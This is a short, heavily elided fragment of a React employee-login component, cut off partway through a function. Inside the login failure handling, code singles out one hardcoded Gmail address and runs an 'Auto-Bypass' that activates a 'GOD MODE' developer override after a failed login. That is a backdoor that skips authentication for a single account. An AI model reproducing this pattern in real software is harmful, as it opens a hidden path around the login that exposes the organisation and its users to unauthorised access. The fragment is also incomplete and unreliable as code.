...
export default function EmployeeLogin() {
  ...
  async function handleLogin(e) {
    ...
    try {
      ...
      // AUTO-ACTIVATE GOD MODE for greenteamdallas@gmail.com on failure
      if (email.toLowerCase() === 'greenteamdallas@gmail.com') {
        console.log('[Auto-Bypass] Login failed, activating Developer Override...');
        setTimeout(() => {
